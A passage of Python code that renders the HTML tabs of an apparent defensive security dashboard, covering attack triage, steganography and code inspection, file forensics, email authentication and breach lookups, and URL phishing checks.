        "scan_time": scan_time,
        "spf": spf,
        "dmarc": dmarc,
        "mx": mx,
        "tls": tls,
        "breaches": breaches
    }
    result["diagnostics"] = build_diagnostics(result)
    return result

# ------------------------------------------------------------
# HTML RENDERING UTILITIES
# ------------------------------------------------------------

def safe(value):
    return html.escape(str(value) if value is not None else "")

def status_badge(status):
    s = (status or "").lower()
    if s == "pass":
        return '<span class="badge pass">PASS</span>'
    elif s == "warn":
        return '<span class="badge warn">WARNING</span>'
    elif s == "fail":
        return '<span class="badge fail">FAIL</span>'
    return '<span class="badge error">ERROR</span>'

# ------------------------------------------------------------
# MAIN DASHBOARD RENDERER
# ------------------------------------------------------------

def render_dashboard(active_tab="email", result=None, err_msg="", submitted_val="",
                     image_res=None, code_res=None, url_res=None, email_phish_res=None,
                     ip_res=None, tech_res=None, ai_answer="", attack_res=None,
                     forensic_res=None, scan_res=None, pwd_strength=None, is_admin=False, **kwargs):

    nav_tabs = ["email", "attack", "scan", "image", "code", "forensics", "password", "url", "ip", "tech", "ai", "starred", "important", "spam", "trash", "admin"]
    t_active = {t: ("active" if active_tab == t else "") for t in nav_tabs}

    content_html = ""

    # --------------------------------------------------------
    # TAB: CYBER ATTACK TRIAGE & INCIDENT RESPONDER
    # --------------------------------------------------------
    if active_tab == "attack":
        attack_view = ""
        if attack_res:
            steps_html = "".join(f"<li>{s}</li>" for s in attack_res["containment"])
            evidence_html = "".join(f"<span class='tag-pill'>📁 {safe(e)}</span> " for e in attack_res["evidence_checklist"])
            findings_html = "".join(f"<div style='color:#ef4444; font-weight:bold; margin-bottom:4px;'>⚠ {safe(f)}</div>" for f in attack_res.get("evidence_findings", []))
            if not findings_html:
                findings_html = "<div style='color:#34d399;'>✓ Generic baseline triage profile initialized.</div>"

            attack_view = f"""
            <div class="summary-card" style="border-left: 4px solid #ef4444;">
                <div class="summary-left">
                    <div class="grade-badge grade-f">🚨</div>
                    <div>
                        <div class="score-display" style="font-size:26px;">{safe(attack_res['title'])}</div>
                        <div class="risk-label" style="color:#f87171;">SEVERITY: {safe(attack_res['severity'])}</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>Anatomy of the Attack (What the Threat Actor Is Doing)</h3>
                <p style="font-size:13px; line-height:1.6; color:#d1dde5;">{safe(attack_res['anatomy'])}</p>
                <div style="margin-top:10px;">{findings_html}</div>
            </div>

            <div class="card" style="border-left: 4px solid #00ffab;">
                <h3 style="color:#00ffab;">⚡ Immediate Emergency Containment Protocol (First 5 Minutes)</h3>
                <ul style="font-size:13px; line-height:1.8; color:#e2fbf4;">
                    {steps_html}
                </ul>
            </div>

            <div class="card">
                <h3>Forensic Evidence to Preserve & Capture</h3>
                <p style="font-size:12px; color:#859ba7;">Do not delete or overwrite these critical artifacts for investigation:</p>
                <div style="margin-top:8px;">{evidence_html}</div>
                <div style="margin-top:16px;">
                    <div class="diag-label">Long-Term Mitigation & Hardening:</div>
                    <p style="font-size:13px; color:#cbd5e1; margin-top:4px;">{safe(attack_res['hardening'])}</p>
                </div>
            </div>
            """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>⚔️ Cyber Attack Triage & Forensic Responder</h2>
                <span class="badge pass">ANY ATTACK VECTOR</span>
            </div>
            <p class="tool-desc">Select the specific type of cyber attack you are facing or analyzing to generate immediate incident containment blueprints, evidence checklists, and threat analysis.</p>

            <form method="POST" action="/?tab=attack" enctype="multipart/form-data" style="flex-direction:column; gap:12px;">
                <div style="display:flex; gap:10px; flex-wrap:wrap;">
                    <div style="flex:1; min-width:240px;">
                        <label style="font-size:12px; color:#00ffab; font-weight:bold;">1. Select Cyber Attack Category:</label>
                        <select name="attack_type" style="width:100%; margin-top:6px; padding:12px; background:#050a0d; border:1px solid #1c3d44; color:#e2fbf4; border-radius:6px; font-family:'Inter',sans-serif;">
                            <option value="ransomware">🛑 Ransomware & System Extortion (.locked files, ransom notes)</option>
                            <option value="phishing">🎣 Phishing, Credential Theft & BEC Wire Fraud</option>
                            <option value="ddos">🌊 DDoS & Botnet Volumetric Traffic Flood</option>
                            <option value="webapp">💥 Web Application Attack (SQLi / XSS / RCE / Webshell)</option>
                            <option value="malware">🦠 Malware Dropper / Trojan / Reverse Shell Backdoor</option>
                            <option value="credentials">🔓 Credential Stuffing & Password Brute Force</option>
                            <option value="stego">🎭 Steganography & Covert Data Hiding</option>
                            <option value="exfiltration">🕵️ Data Exfiltration & Insider Threat</option>
                            <option value="mitm">📡 Man-in-the-Middle (MitM) & SSL Stripping</option>
                            <option value="dns">🌐 DNS Hijacking & Subdomain Takeover</option>
                        </select>
                    </div>
                </div>

                <div>
                    <label style="font-size:12px; color:#00ffab; font-weight:bold;">2. Paste Suspicious Indicators, Logs, URLs, or Ransom Note:</label>
                    <textarea name="user_evidence" rows="4" placeholder="Paste suspicious command lines, ransom notes, strange URLs, error messages, or email text here..." class="code-textarea" style="margin-top:6px;">{safe(submitted_val)}</textarea>
                </div>

                <div>
                    <label style="font-size:12px; color:#00ffab; font-weight:bold;">3. Or Upload Evidence File / Screenshot / Artifact from Mobile or PC:</label>
                    <input type="file" name="evidence_file" style="margin-top:6px; width:100%;">
                </div>

                <button type="submit" style="margin-top:6px;">Triage Cyber Attack & Generate Incident Response</button>
            </form>
            {attack_view}
        </div>
        """

    # --------------------------------------------------------
    # TAB: REVERSE IMAGE SEARCH & STEGANOGRAPHY INSPECTOR
    # --------------------------------------------------------
    elif active_tab == "image":
        res_view = ""
        if image_res:
            if "error" in image_res:
                res_view = f'<div class="card error-banner">{safe(image_res["error"])}</div>'
            else:
                links_html = "".join(f'<a href="{url}" target="_blank" class="search-engine-btn">🔍 {name}</a>' for name, url in image_res["search_links"].items())
                
                exif = image_res.get("exif", {})
                gps_html = '<span style="color:#859ba7;">No GPS geotags embedded</span>'
                if exif.get("has_gps"):
                    gps_html = f'<a href="{exif["gps_maps_url"]}" target="_blank" class="quick-btn" style="background:#063828; color:#00ffab; font-weight:bold;">📍 View on Google Maps ({exif["gps_lat"]}, {exif["gps_lon"]})</a>'

                stego_banner = ""
                if exif.get("stego_alert"):
                    stego_banner = f'<div class="breakpoint-marker" style="margin-bottom:15px; text-align:left;">{safe(exif["stego_alert"])}</div>'

                # Plain-English Explanation Card
                malicious_card = ""
                if image_res.get("is_malicious"):
                    malicious_card = f"""
                    <div class="card" style="border-left: 4px solid #ef4444; background: linear-gradient(135deg, #1c0e12, #0d0709);">
                        <h3 style="color:#f87171;">🚨 Image Malicious Code Explanation (What This Code Is Telling About)</h3>
                        <div style="font-size:13px; line-height:1.7; color:#fca5a5; white-space:pre-wrap;">{safe(image_res['malicious_code_explanation'])}</div>
                    </div>
                    """
                else:
                    malicious_card = f"""
                    <div class="card breach-clean">
                        <h3>✓ Image Integrity Verified</h3>
                        <p style="font-size:13px; color:#cbd5e1; margin:0;">No steganographic hidden payloads, webshells, polyglot ZIPs, or XSS script tags discovered inside this picture.</p>
                    </div>
                    """

                res_view = f"""
                {stego_banner}
                {malicious_card}

                <div class="card">
                    <h3>Genuine Reverse Search Engine Links</h3>
                    <p style="font-size:13px; color:#859ba7;">Click any global visual discovery provider below to execute instant query lookups:</p>
                    <div class="btn-group">{links_html}</div>
                </div>

                <div class="card">
                    <h3>Forensic EXIF Metadata & Geolocation Intel</h3>
                    <div class="diag-row"><div class="diag-label">Camera Hardware:</div><div class="diag-value"><strong>{safe(exif.get('make') or 'Not reported')}</strong> &bull; Model: {safe(exif.get('model') or 'Not reported')}</div></div>
                    <div class="diag-row"><div class="diag-label">Software / Editing Tool:</div><div class="diag-value">{safe(exif.get('software') or 'Original Sensor Capture / Clean')}</div></div>
                    <div class="diag-row"><div class="diag-label">Capture Timestamp:</div><div class="diag-value">{safe(exif.get('datetime') or 'Not specified in EXIF header')}</div></div>
                    <div class="diag-row"><div class="diag-label">Dimensions / Color Space:</div><div class="diag-value">{safe(exif.get('width') or 'Auto')} x {safe(exif.get('height') or 'Auto')} px &bull; Color: {safe(exif.get('color_profile', 'sRGB'))}</div></div>
                    <div class="diag-row"><div class="diag-label">GPS Geolocation Tag:</div><div class="diag-value">{gps_html}</div></div>
                </div>

                <div class="card">
                    <h3>Cryptographic Fingerprint & Steganography Audit</h3>
                    <div class="diag-row"><div class="diag-label">Payload Size:</div><div class="diag-value">{safe(image_res['size_kb'])} &bull; Format: {safe(image_res['format'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Shannon Byte Entropy:</div><div class="diag-value"><code>{image_res.get('entropy', 0.0)} / 8.0</code></div></div>
                    <div class="diag-row"><div class="diag-label">MD5 Cryptographic Hash:</div><div class="diag-value"><code>{safe(image_res['md5'])}</code></div></div>
                    <div class="diag-row"><div class="diag-label">SHA-256 Digest:</div><div class="diag-value"><code>{safe(image_res['sha256'])}</code></div></div>
                    <div class="diag-row"><div class="diag-label">64-Bit Perceptual Fingerprint:</div><div class="diag-value"><code>0x{safe(image_res['perceptual_hash'])}</code></div></div>
                </div>
                """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🔍 Reverse Image Search, Steganography & Malicious Code Inspector</h2>
                <span class="badge pass">STEGO & POLYGLOT SHIELD</span>
            </div>
            <p class="tool-desc">Upload pictures from your PC or mobile, paste an image link, or drag & drop to detect steganography payloads, hidden webshells, camera EXIF geotags, and run genuine reverse search across Google Lens, TinEye, Bing, and Yandex.</p>
            
            <!-- File Upload / Picture Selection Form (Mobile & Desktop) -->
            <form method="POST" action="/?tab=image" enctype="multipart/form-data" style="flex-direction:column; gap:10px; border:1px solid #00ffab; background:#041410;">
                <div style="font-weight:bold; color:#00ffab; font-size:13px;">📸 Select Picture / File from Your Mobile or PC:</div>
                <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
                    <input type="file" name="image_file" accept="image/*,.jpg,.jpeg,.png,.webp,.gif,.bmp,.svg,.pdf" style="flex:1;">
                    <button type="submit" style="background:#00ffab; color:#04120f;">Inspect Selected Picture</button>
                </div>
            </form>

            <div style="text-align:center; color:#557280; font-size:12px; margin: 10px 0;">&mdash; OR ENTER IMAGE URL &mdash;</div>

            <form method="GET" action="/">
                <input type="hidden" name="tab" value="image">
                <input name="target" placeholder="Enter online image URL (e.g. https://images.unsplash.com/...)" value="{safe(submitted_val)}">
                <button type="submit">Inspect URL</button>
            </form>

            {res_view}
        </div>
        """

    # --------------------------------------------------------
    # TAB: MALICIOUS CODE ANALYZER & PLAIN-ENGLISH TRANSLATOR
    # --------------------------------------------------------
    elif active_tab == "code":
        code_view = ""
        if code_res:
            if "error" in code_res:
                code_view = f'<div class="card error-banner">{safe(code_res["error"])}</div>'
            else:
                findings_html = ""
                for f in code_res["findings"]:
                    sev_upper = str(f.get("severity", "")).upper()
                    sev_class = "fail" if sev_upper == "CRITICAL" else ("warn" if sev_upper in ("HIGH", "MEDIUM") else "pass")
                    findings_html += f"""
                    <div class="code-finding-card">
                        <div class="card-head">
                            <strong>Line {f['line']}: {safe(f['name'])}</strong>
                            <span class="badge {sev_class}">{f['severity']}</span>
                        </div>
                        <pre class="diag-code">{safe(f['code'])}</pre>
                        <div style="margin-top:8px;">
                            <div class="diag-label">Why It Is Dangerous (Root Cause Study):</div>
                            <p class="diag-desc">{safe(f['desc'])}</p>
                        </div>
                        <div style="margin-top:8px;">
                            <div class="diag-label">Remediation / Secure Code Replacement:</div>
                            <pre class="diag-code" style="color:#00ffab; background:#041410;">{safe(f['fix'])}</pre>
                        </div>
                    </div>
                    """
                if not findings_html:
                    findings_html = '<div class="card breach-clean">✓ No malicious signatures, destructive commands, or credential leaks detected. Clean code study verdict!</div>'

                # Plain-English Explanation Box
                explanation_card = f"""
                <div class="card" style="border-left: 4px solid #38bdf8; background: linear-gradient(135deg, #091720, #060e14);">
                    <div class="card-head">
                        <h3 style="color:#38bdf8;">📖 Plain-English Translation: What This Malicious Code Is Telling About</h3>
                    </div>
                    <div style="font-size:13px; line-height:1.7; color:#d6e8f0; white-space:pre-wrap;">{safe(code_res.get('plain_explanation', ''))}</div>
                </div>
                """

                grade_c = str(code_res.get('grade', 'F'))[0].lower()
                risk_str = str(code_res.get('risk', ''))
                risk_color = "#00ffab"
                if "CRITICAL" in risk_str: risk_color = "#ff4444"
                elif "HIGH" in risk_str: risk_color = "#ffaa00"
                elif "MODERATE" in risk_str: risk_color = "#ffdd00"
                
                code_view = f"""
                <div class="summary-card">
                    <div class="summary-left">
                        <div class="grade-badge grade-{grade_c}">{code_res['grade']}</div>
                        <div>
                            <div class="score-display">{code_res['score']}<span>/100</span></div>
                            <div class="risk-label" style="color: {risk_color}; font-weight: bold; font-size: 16px;">{code_res['risk']}</div>
                        </div>
                    </div>
                    <div class="summary-right">
                        <div><strong>Language Detected:</strong> <span class="highlight">{safe(code_res['language'])}</span></div>
                        <div><strong>Total Lines Scanned:</strong> {code_res['total_lines']}</div>
                        <div><strong>Security Findings:</strong> {len(code_res['findings'])}</div>
                    </div>
                </div>

                {explanation_card}

                <div class="card">
                    <div class="card-head">
                        <h3>Comprehensive Code Study & Remediation Report</h3>
                        <button onclick="navigator.clipboard.writeText(document.getElementById('code-report').innerText); alert('Complete Code Study copied to clipboard!');" class="quick-btn" style="background:#0d2822; color:#00ffab;">📋 Copy Study</button>
                    </div>
                    <div id="code-report">
                        {findings_html}
                    </div>
                </div>
                """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🦠 Malicious Code Analyzer & Plain-English Translation Study</h2>
                <span class="badge pass">SAST & DECODE ENGINE</span>
            </div>
            <p class="tool-desc">Upload files/scripts or paste code (Python, JavaScript, PHP, PowerShell, Bash, C/C++) to detect command injection, reverse shells, webshells, and receive a plain-English explanation of what the code is attempting to do.</p>
            
            <!-- File Upload for Code -->
            <form method="POST" action="/?tab=code" enctype="multipart/form-data" style="flex-direction:column; gap:10px; border:1px solid #1c3d44;">
                <div style="font-weight:bold; color:#00ffab; font-size:13px;">📁 Or Upload Script/Source File from System or Mobile:</div>
                <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
                    <input type="file" name="code_file" accept=".py,.js,.php,.sh,.ps1,.c,.cpp,.html,.txt" style="flex:1;">
                    <button type="submit">Audit Uploaded File</button>
                </div>
            </form>

            <div class="quick-prompts" style="margin:12px 0;">
                <button type="button" onclick="loadSample('python')" class="quick-btn">Load Vulnerable Python Shell Sample</button>
                <button type="button" onclick="loadSample('nodejs')" class="quick-btn">Load Insecure Node.js / SQLi Sample</button>
                <button type="button" onclick="loadSample('php')" class="quick-btn">Load PHP Webshell Sample</button>
            </div>

            <form method="POST" action="/?tab=code">
                <textarea id="code_input" name="code_snippet" rows="8" placeholder="Paste source code or script here to perform complete security study..." required class="code-textarea">{safe(submitted_val)}</textarea>
                <button type="submit" style="margin-top:10px;">Audit Code & Explain Intent</button>
            </form>
            {code_view}
        </div>
        """

    # --------------------------------------------------------
    # TAB: DIGITAL FORENSIC TOOLKIT
    # --------------------------------------------------------
    elif active_tab == "forensics":
        forensic_view = ""
        if forensic_res:
            spoof_banner = ""
            if forensic_res.get("extension_spoof_alert"):
                spoof_banner = f'<div class="breakpoint-marker" style="margin-bottom:15px; text-align:left;">{safe(forensic_res["extension_spoof_alert"])}</div>'

            strings_html = "".join(f"<div style='margin-bottom:2px;'><code>{safe(s)}</code></div>" for s in forensic_res["extracted_strings"])
            if not strings_html:
                strings_html = "<div style='color:#859ba7;'>No printable strings discovered.</div>"

            forensic_view = f"""
            {spoof_banner}

            <div class="summary-card">
                <div class="summary-left">
                    <div class="grade-badge grade-b">🧰</div>
                    <div>
                        <div class="score-display" style="font-size:24px;">{safe(forensic_res['true_file_type'])}</div>
                        <div class="risk-label">{safe(forensic_res['filename'])} ({forensic_res['size_kb']})</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <h3>True Magic Header & Entropy Assessment</h3>
                <div class="diag-row"><div class="diag-label">True Internal Signature:</div><div class="diag-value"><strong>{safe(forensic_res['true_file_type'])}</strong></div></div>
                <div class="diag-row"><div class="diag-label">Shannon Randomness Entropy:</div><div class="diag-value"><code>{forensic_res['entropy']} / 8.0</code> &bull; <span class="highlight">{safe(forensic_res['entropy_verdict'])}</span></div></div>
                <div class="diag-row"><div class="diag-label">MD5 Cryptographic Hash:</div><div class="diag-value"><code>{safe(forensic_res['md5'])}</code></div></div>
                <div class="diag-row"><div class="diag-label">SHA-256 Digest:</div><div class="diag-value"><code>{safe(forensic_res['sha256'])}</code></div></div>
            </div>

            <div class="card">
                <h3>Hexadecimal Header Dump (First 128 Bytes)</h3>
                <pre class="diag-code" style="font-size:11px; color:#859ba7;">{safe(forensic_res['hex_preview'])}</pre>
            </div>

            <div class="card">
                <h3>Extracted Forensic Strings (URLs, IPs, Commands, Keys)</h3>
                <div style="max-height:220px; overflow-y:auto; background:#050a0d; border:1px solid #142730; padding:10px; border-radius:6px; font-size:12px;">
                    {strings_html}
                </div>
            </div>
            """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🧰 Digital Forensic Toolkit & Deep File Inspector</h2>
                <span class="badge pass">DEEP ARTIFACT LAB</span>
            </div>
            <p class="tool-desc">Inspect true magic bytes (detect extension spoofing), compute Shannon entropy to detect packed ransomware, extract printable ASCII/Unicode strings, and calculate cryptographic digests.</p>

            <!-- File Upload for Forensics -->
            <form method="POST" action="/?tab=forensics" enctype="multipart/form-data" style="flex-direction:column; gap:10px; border:1px solid #1c3d44;">
                <div style="font-weight:bold; color:#00ffab; font-size:13px;">📁 Select Any File, Folder Asset, or Executable to Inspect:</div>
                <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
                    <input type="file" name="forensic_file" style="flex:1;">
                    <button type="submit">Perform Forensic Analysis</button>
                </div>
            </form>
            {forensic_view}
        </div>
        """

    # --------------------------------------------------------
    # TAB: EMAIL POSTURE & BREACH SCANNER
    # --------------------------------------------------------
    elif active_tab == "email":
        posture_content = ""
        if result:
            grade_class = "grade-" + result["grade"][0].lower()
            spf_st = result["spf"]["status"].lower()
            dmarc_st = result["dmarc"]["status"].lower()
            mx_st = result["mx"]["status"].lower()
            tls_st = result["tls"]["status"].lower()

            break_tag = ""
            if dmarc_st in ("fail", "error"):
                break_tag = '<div class="breakpoint-marker">▲ ROOT ERROR SOURCE: DNS _dmarc TXT record missing</div>'
            elif spf_st in ("fail", "error"):
                break_tag = '<div class="breakpoint-marker">▲ ROOT ERROR SOURCE: DNS SPF TXT record missing</div>'
            elif tls_st in ("fail", "error"):
                break_tag = '<div class="breakpoint-marker">▲ ROOT ERROR SOURCE: Port 443 SSL certificate invalid</div>'

            breaches_data = result.get("breaches", {})
            breach_section = ""
            if breaches_data.get("is_email"):
                if breaches_data.get("found"):
                    b_count = breaches_data["count"]
                    gravatar = breaches_data.get("gravatar", "")
                    profile_html = f'<img src="{gravatar}" style="width:64px; height:64px; border-radius:50%; border:2px solid #ff4444; margin-right:15px; float:left;">' if gravatar else ""
                    b_items = breaches_data["breaches"][:12]
                    cards_html = ""
                    for b in b_items:
                        b_logo = safe(b.get("logo", ""))
                        logo_html = f'<img src="{b_logo}" alt="logo" class="breach-logo" onerror="this.style.display=&quot;none&quot;">' if b_logo else ''
                        cards_html += f"""
                        <a href="https://www.google.com/search?q={urllib.parse.quote(b.get("breach", "Service") + ' data breach')}" target="_blank" style="text-decoration:none; color:inherit;">
                        <div class="breach-item-card" style="cursor:pointer; transition: transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 4px 12px rgba(0,0,0,0.5)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none';">
                            <div class="breach-card-top">
                                {logo_html}
                                <div>
                                    <h5 class="breach-title">{safe(b.get("breach", "Service"))}</h5>
                                    <div class="breach-domain">{safe(b.get("domain", ""))} &bull; <span class="breach-year">{safe(b.get("xposed_date", ""))}</span></div>
                                    <div style="font-size:11px; color:#94a3b8; margin-top:3px;">
                                        Industry: <span style="color:#e2e8f0;">{safe(b.get("industry", "Unknown"))}</span> &bull; 
                                        Records Leaked: <span style="color:#ef4444; font-weight:bold;">{safe(b.get("records", "Unknown"))}</span>
                                    </div>
                                </div>
                            </div>
                            <div class="breach-tags" style="margin-top:10px;">{format_data_tags(b.get("xposed_data", ""))}</div>
                            <p class="breach-desc" style="margin-top:8px;">{safe(b.get("details", ""))}</p>
                        </div>
                        </a>
                        """
                    breach_section = f"""
                    <div class="card breach-container breach-alert">
                        <div class="breach-header">
                            <div>
                                {profile_html}
                                <h3 class="breach-headline" style="margin-top:0;">⚠ Critical Account Breach Exposure</h3>
                                <div class="breach-sub" style="margin-top:5px;">This email was found in <strong>{b_count}</strong> publicly leaked database breaches!</div>
                                <div style="clear:both;"></div>
                            </div>
                            <span class="badge fail">{b_count} BREACHES</span>
                        </div>
                        <div class="breach-grid">{cards_html}</div>
                    </div>
                    """
                else:
                    gravatar = breaches_data.get("gravatar", "")
                    profile_html = f'<img src="{gravatar}" style="width:64px; height:64px; border-radius:50%; border:2px solid #00ffab; margin-right:15px; float:left;">' if gravatar else ""
                    breach_section = f"""
                    <div class="card breach-container breach-clean">
                        <div style="display:flex; align-items:center;">
                            {profile_html}
                            <div>
                                <h3 class="breach-headline-clean" style="margin-top:0;">✓ No Public Data Breaches Detected</h3>
                                <div class="breach-sub">No compromised credentials found in known breach archives for <strong>{safe(result['input'])}</strong>.</div>
                            </div>
                        </div>
                    </div>
                    """
            else:
                breach_section = """
                <div class="card breach-container breach-neutral">
                    <h3 class="breach-headline-neutral">ℹ Personal Email Breach Scanner</h3>
                    <div class="breach-sub">Enter a full email address (e.g. <code>user@example.com</code>) to scan across 500+ compromised apps and database dumps.</div>
                </div>
                """

            diag_html = ""
            for d in result.get("diagnostics", []):
                diag_html += f"""
                <div class="diag-card diag-{d['status'].lower()}">
                    <div class="diag-head">
                        <div class="diag-title">{safe(d['title'])}</div>
                        {status_badge(d['status'])}
                    </div>
                    <div class="diag-row"><div class="diag-label">Where the Error Comes From:</div><div class="diag-value"><code>{safe(d['source'])}</code> &bull; <span class="highlight">{safe(d['layer'])}</span></div></div>
                    <div class="diag-row"><div class="diag-label">Why It Happens (Root Cause):</div><div class="diag-desc">{safe(d['why'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Security Threat:</div><div class="diag-threat">{safe(d['threat'])}</div></div>
                    <div class="diag-row"><div class="diag-label">Exact Solution & DNS Fix:</div><pre class="diag-code">{safe(d['fix'])}</pre></div>
                </div>
                """

            posture_content = f"""
            <div class="summary-card">
                <div class="summary-left">
                    <div class="grade-badge {grade_class}">{result["grade"]}</div>
                    <div>
                        <div class="score-display">{result["score"]}<span>/100</span></div>
                        <div class="risk-label">{result["risk"]}</div>
                    </div>
                </div>
                <div class="summary-right">
                    <div><strong>Target:</strong> <span class="highlight">{safe(result["input"])}</span></div>
                    <div><strong>Domain:</strong> <span class="highlight">{safe(result["domain"])}</span></div>
                    <div><strong>Mail Host:</strong> {safe(result["mx"].get("provider", "N/A"))}</div>
                    <div><strong>Scan Time:</strong> {safe(result["scan_time"])}</div>
                </div>
            </div>

            <!-- GRAPHICAL PIPELINE -->
            <div class="card graph-card">
                <h3 class="graph-title">Graphical Security & Authentication Pipeline</h3>
                <div class="pipeline-flow">
                    <div class="flow-node node-neutral"><div class="node-icon">✉</div><div class="node-name">1. Sender</div><div class="node-meta">Origin MTA</div></div>
                    <div class="flow-connector">&rarr;</div>
                    <div class="flow-node node-{spf_st}"><div class="node-status-badge">{result["spf"]["status"]}</div><div class="node-icon">🛡</div><div class="node-name">2. SPF</div><div class="node-meta">TXT: @{safe(result["domain"])}</div></div>
                    <div class="flow-connector">&rarr;</div>
                    <div class="flow-node node-{dmarc_st}"><div class="node-status-badge">{result["dmarc"]["status"]}</div><div class="node-icon">📜</div><div class="node-name">3. DMARC</div><div class="node-meta">_dmarc.{safe(result["domain"])}</div></div>
                    <div class="flow-connector">&rarr;</div>
                    <div class="flow-node node-{mx_st}"><div class="node-status-badge">{result["mx"]["status"]}</div><div class="node-icon">🏢</div><div class="node-name">4. MX Host</div><div class="node-meta">{safe(result["mx"].get("provider", "MX"))}</div></div>
                    <div class="flow-connector">&rarr;</div>
                    <div class="flow-node node-{tls_st}"><div class="node-status-badge">{result["tls"]["status"]}</div><div class="node-icon">🔒</div><div class="node-name">5. TLS</div><div class="node-meta">{safe(result["domain"])}:443</div></div>
                </div>
                {break_tag}
            </div>

            {breach_section}

            <div class="card">
                <h3 class="graph-title">Detailed Diagnostic Breakdown & Root Cause Analysis</h3>
                <div class="diag-grid">{diag_html}</div>
            </div>
            """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>✉️ Email & Domain Security Analyzer</h2>
                <span class="badge pass">RFC 7208 / 7489 COMPLIANT</span>
            </div>
            <p class="tool-desc">Analyze SPF origin authentication, DMARC policy enforcement, MX routing, TLS certificates, and account data breaches with 100% genuine results.</p>
            <form method="GET" action="/">
                <input type="hidden" name="tab" value="email">
                <input name="target" placeholder="Enter an email (e.g. user@gmail.com) or domain (e.g. google.com)" value="{safe(submitted_val)}" required>
                <button type="submit">Scan Posture</button>
            </form>
            {posture_content}
        </div>
        """

    # --------------------------------------------------------
    # TAB: WEBSITE / URL PHISHING & HEADERS
    # --------------------------------------------------------
    elif active_tab == "url":
        url_view = ""
        if url_res:
            if "error" in url_res:
                url_view = f'<div class="card error-banner">{safe(url_res["error"])}</div>'
            else:
                phish_html = "".join(f"<li>{safe(ind)}</li>" for ind in url_res["phishing_indicators"])
                if not phish_html:
                    phish_html = "<li>✓ No homograph, excessive subdomains, or brand impersonation heuristics detected.</li>"

                headers_html = "".join(f"<tr><td><strong>{safe(k)}</strong></td><td><code>{safe(v)}</code></td></tr>" for k, v in url_res["headers_found"].items())
                missing_html = "".join(f"<tr><td style='color:#ef4444;'><strong>{safe(k)}</strong></td><td>{safe(desc)}<br><pre class='diag-code' style='margin-top:4px;'>{safe(fix)}</pre></td></tr>" for k, desc, fix in url_res["missing_headers"])

                url_view = f"""
                <div class="summary-card">
                    <div class="summary-left">
                        <div class="score-display">{url_res['score']}<span>/100</span></div>
                        <div class="risk-label">{url_res['verdict']}</div>
                    </div>
                    <div class="summary-right">
                        <div><strong>Security Strength:</strong> <span class="highlight">{safe(url_res['security_level'])}</span></div>
                        <div><strong>Legality Assessment:</strong> <span class="highlight">{safe(url_res['legality'])}</span></div>
                        <div><strong>Legitimacy Status:</strong> <span class="highlight">{safe(url_res['legitimacy'])}</span></div>
                        <div><strong>Server Technology:</strong> {safe(url_res['server_tech'])}</div>
                    </div>
                </div>

                <div class="card">
                    <h3>Basic Report Summary</h3>
                    <p style="font-size:13px; color:#d1dde5; line-height:1.6;">
                        Target Domain: <code>{safe(url_res['host'])}</code><br>
                        SSL Encryption Active: <strong>{'YES (HTTPS Active)' if url_res['ssl_active'] else 'NO / UNENCRYPTED'}</strong><br>
                        Security Rating: <strong>{safe(url_res['security_level'])} ({url_res['score']}/100)</strong><br>
                        Phishing Heuristics Flagged: <strong>{len(url_res['phishing_indicators'])}</strong>
                    </p>
                </div>

                <div class="card">
                    <h3>Phishing & Brand Impersonation Heuristics</h3>
                    <ul>{phish_html}</ul>
                </div>

                <div class="card">
                    <h3>Website Security Headers & Remediation Guide</h3>
                    <table class="telemetry-table">
                        <thead><tr><th>Active Security Header</th><th>Value</th></tr></thead>
                        <tbody>{headers_html or '<tr><td colspan="2">No standard hardening headers found</td></tr>'}</tbody>
                    </table>
                    <h4 style="margin-top:20px; color:#ef4444;">Missing Hardening Headers & Server Nginx/Apache Directives:</h4>
                    <table class="telemetry-table">
                        <thead><tr><th>Missing Header</th><th>Risk & Fix Directives</th></tr></thead>
                        <tbody>{missing_html or '<tr><td colspan="2">All recommended security headers are active!</td></tr>'}</tbody>
                    </table>
                </div>
                """

        email_phish_view = ""
        if email_phish_res:
            if "error" in email_phish_res:
                email_phish_view = f'<div class="card error-banner">{safe(email_phish_res["error"])}</div>'
            else:
                ind_html = "".join(f"<li>{safe(i)}</li>" for i in email_phish_res["indicators"])
                if not ind_html:
                    ind_html = "<li>✓ No coercive phishing triggers or spoofing patterns detected in this email.</li>"
                urls_html = "".join(f"<div><code>{safe(u)}</code></div>" for u in email_phish_res["extracted_urls"])
                badge_class = "fail" if email_phish_res["is_phishing"] else "pass"
                email_phish_view = f"""
                <div class="card" style="margin-top:20px; border-left: 4px solid {'#ef4444' if email_phish_res['is_phishing'] else '#00ffab'};">
                    <div class="card-head">
                        <h3>Phishing Email Forensic Analysis</h3>
                        <span class="badge {badge_class}">{email_phish_res['verdict']}</span>
                    </div>
                    <div style="font-size:14px; margin-bottom:10px;">Security Confidence Score: <strong>{email_phish_res['score']}/100</strong></div>
                    <h4>Social Engineering & Spoofing Indicators:</h4>
                    <ul>{ind_html}</ul>
                    <h4>Extracted Embedded URLs:</h4>
                    {urls_html or '<p style="color:#859ba7; font-size:12px;">No links found in email body.</p>'}
                </div>
                """

        content_html = f"""
        <div class="tool-pane">
            <div class="pane-header">
                <h2>🌐 Website Security, URL & Phishing Email Analyzer</h2>
                <span class="badge pass">DEEP INSPECTOR</span>
            </div>
            <p class="tool-desc">Verify website details (Weak, Strong, Moderate), legality (Legal / Illegal), legitimacy (Legitimate or Not), inspect HTTP security headers, and analyze phishing email messages.</p>
            
            <form method="GET" action="/">
                <input type="hidden" name="tab" value="url">
                <input name="target" placeholder="Enter website URL (e.g. https://google.com or https://paypal-security-login.xyz)" value="{safe(submitted_val)}" required>
                <button type="submit">Analyze Website & URL</button>
            </form>
            {url_view}

            <div class="card" style="margin-top:30px;">
                <h3>📧 Phishing Email Text & Header Deep Analyzer</h3>
